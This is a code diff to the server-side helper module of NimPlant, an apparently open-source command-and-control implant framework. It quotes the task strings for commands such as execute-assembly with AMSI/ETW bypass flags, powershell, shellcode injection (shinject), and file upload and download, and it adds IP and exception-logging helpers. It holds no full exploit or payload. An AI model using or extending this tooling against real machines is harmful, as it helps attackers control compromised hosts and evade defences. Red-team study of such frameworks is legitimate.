@@ -1,9 +1,13 @@
+import shlex
+import traceback
 from datetime import datetime
 from struct import pack, calcsize
 from time import sleep
+from typing import Optional
 from zlib import compress
 import base64
 import os, hashlib, json, sys
+from flask import Request
 
 
 # Clear screen
@@ -216,9 +220,7 @@ def executeAssembly(np, args, raw_command):
     assembly = encryptData(assembly, np.cryptKey)
     assemblyArgs = " ".join(args[k + 1 :])
 
-    commandArgs = " ".join([amsi, etw, assembly, assemblyArgs])
-
-    command = f"execute-assembly {commandArgs}"
+    command = ' '.join(shlex.quote(arg) for arg in ["execute-assembly", amsi, etw, assembly, assemblyArgs])
 
     guid = np.addTask(command, taskFriendly=raw_command)
     nimplantPrint(
@@ -369,8 +371,8 @@ def inlineExecute(np, args, raw_command):
     else:
         assemblyArgs_final = ""
 
-    commandArgs = " ".join([assembly, entryPoint, assemblyArgs_final])
-    command = f"inline-execute {commandArgs}"
+    command = ' '.join(shlex.quote(arg) for arg in ["inline-execute", assembly, entryPoint, assemblyArgs_final])
+
     guid = np.addTask(command, taskFriendly=raw_command)
     nimplantPrint("Staged inline-execute command for NimPlant.", np.guid, taskGuid=guid)
 
@@ -399,9 +401,7 @@ def powershell(np, args, raw_command):
         )
         return
 
-    commandArgs = " ".join([amsi, etw, powershellCmd])
-
-    command = f"powershell {commandArgs}"
+    command = ' '.join(shlex.quote(arg) for arg in ["powershell", amsi, etw, powershellCmd])
 
     guid = np.addTask(command, taskFriendly=raw_command)
     nimplantPrint("Staged powershell command for NimPlant.", np.guid, taskGuid=guid)
@@ -428,9 +428,7 @@ def shinject(np, args, raw_command):
         shellcode = compress(shellcode, level=9)
         shellcode = encryptData(shellcode, np.cryptKey)
 
-        commandArgs = " ".join([processId, shellcode])
-
-        command = f"shinject {commandArgs}"
+        command = ' '.join(shlex.quote(arg) for arg in ["shinject", processId, shellcode])
 
         guid = np.addTask(command, taskFriendly=raw_command)
         nimplantPrint("Staged shinject command for NimPlant.", np.guid, taskGuid=guid)
@@ -464,7 +462,7 @@ def uploadFile(np, args, raw_command):
 
     if os.path.isfile(filePath):
         np.hostFile(filePath)
-        command = f"upload {fileId} {fileName} {remotePath}"
+        command = ' '.join(shlex.quote(arg) for arg in ["upload", fileId, fileName, remotePath])
 
         guid = np.addTask(command, taskFriendly=raw_command)
         nimplantPrint("Staged upload command for NimPlant.", np.guid, taskGuid=guid)
@@ -496,7 +494,8 @@ def downloadFile(np, args, raw_command):
 
     os.makedirs(os.path.dirname(localPath), exist_ok=True)
     np.receiveFile(localPath)
-    command = f"download {filePath}"
+    command = ' '.join(shlex.quote(arg) for arg in ["download", filePath])
+    print(f"Added task is => {command}")
 
     guid = np.addTask(command, taskFriendly=raw_command)
     nimplantPrint("Staged download command for NimPlant.", np.guid, taskGuid=guid)
@@ -569,3 +568,46 @@ def tailNimPlantLog(np=None, lines=100):
         logContents = ""
 
     return {"id": id, "lines": lines, "result": logContents}
+
+
+# Define a utility function to easily get the 'real' IP from a request
+def get_external_ip(request: Request):
+    if request.headers.get("X-Forwarded-For"):
+        return request.access_route[0]
+    else:
+        return request.remote_addr
+
+
+def dump_debug_info_for_exception(error: Exception, request: Optional[Request] = None) -> None:
+    # Capture the full traceback as a string
+    traceback_str = ''.join(traceback.format_exception(etype=type(error), value=error, tb=error.__traceback__))
+
+    # Log detailed error information
+    nimplantPrint("Detailed traceback:")
+    nimplantPrint(traceback_str)
+
+    # Additional request context
+    request_headers = dict(request.headers)
+    request_method = request.method
+    request_path = request.path
+    request_query_string = request.query_string.decode('utf-8')
+    request_remote_addr = request.remote_addr
+    try:
+        request_body_snippet = request.get_data(as_text=True)[:200]  # Log only the first 200 characters
+    except Exception as e:
+        request_body_snippet = "Error reading request body: " + str(e)
+
+    # Environment details
+    environment_details = {
+        'REQUEST_METHOD': request_method,
+        'PATH_INFO': request_path,
+        'QUERY_STRING': request_query_string,
+        'REMOTE_ADDR': request_remote_addr,
+        'REQUEST_HEADERS': request_headers,
+        'REQUEST_BODY_SNIPPET': request_body_snippet,
+    }
+
+    # Log additional context
+    nimplantPrint("Request Details:")
+    nimplantPrint(json.dumps(environment_details, indent=4, ensure_ascii=False))
+
